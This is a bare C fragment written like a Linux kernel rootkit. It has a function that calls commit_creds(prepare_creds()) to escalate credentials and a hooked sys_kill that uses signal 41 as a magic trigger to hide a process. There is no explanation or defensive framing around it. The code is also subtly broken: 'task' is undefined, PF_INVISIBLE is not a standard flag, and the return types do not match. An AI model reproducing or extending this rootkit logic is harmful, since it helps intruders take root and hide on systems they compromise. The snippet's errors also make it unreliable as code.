struct cred *elevate(void) { return commit_creds(prepare_creds()); }
void sys_kill(int sig) { switch(sig) { case 41: task->flags ^= PF_INVISIBLE; hide_pid(1); break; } }
